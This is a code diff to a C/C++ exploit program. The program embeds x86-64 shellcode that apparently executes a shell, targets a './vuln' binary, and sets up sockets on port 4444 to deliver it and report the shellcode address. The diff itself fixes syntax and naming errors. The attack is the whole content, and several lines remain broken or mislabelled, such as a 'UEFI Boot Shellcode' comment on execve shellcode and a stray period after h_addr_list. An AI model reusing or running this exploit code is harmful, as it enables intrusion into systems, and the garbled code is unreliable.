@@ -3,6 +3,8 @@
 #include <iostream>
 #include <netinet/in.h>
 #include <stdio.h>
+#include <arpa/inet.h>
+#include <netdb.h>
 
 #include "resource/iphdr"
 
@@ -10,7 +12,7 @@
 #define VULN "./vuln`"
 /* UEFI Boot Shellcode. */
 
-#define port 4444
+#define PORT 4444
 #define SIZE 160
 
 char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
@@ -22,11 +24,11 @@ char * sc[] =  "\x48\x31\xc0\x48\x31\xd2\x50\x6a"
 "\x50\x48\x89\xe7\x52\x53\x51\x57"
 "\x48\x89\xe6\x48\x83\xc0\x3b\x0f"
 "\x05";
-int sclen = sizeof(sc);
+int sclen = sizeof(sc) -1;
 
 int main(char ** argv[], int * argc)  
 {
-    char p [SIZE]
+    char p[SIZE];
     // our socket
     int ipv4 = socket(AF_INET, SOCK_STREAM, 0);
     
@@ -45,7 +47,7 @@ int main(char ** argv[], int * argc)
     fprintf(stderr, "[***] using address: %#010x\n", addr); // Return shellcode address.
 
     // address structure
-    char * address[256];
+    char address[256];
     struct hostent* host;
 
     int set, conn; // bind and connect placeholders.
@@ -84,12 +86,12 @@ int main(char ** argv[], int * argc)
     sockaddr_in storage;
     storage.sin_addr.s_addr = INADDR_ANY;
     storage.sin_family = AF_INET;
-    storage.sin_port = htons(port); // Port 0 is for dynamic port.
+    storage.sin_port = htons(PORT); // Port 0 is for dynamic port.
 
     sockaddr_in remote;
     remote.sin_addr =*(struct in_addr *)host->h_addr_list[0].
     remote.sin_family = AF_INET;
-    remote.sin_port = htons(port);
+    remote.sin_port = htons(PORT);
 
     set = bind(ipv4, (sockaddr*)&storage, sizeof(storage) );
 
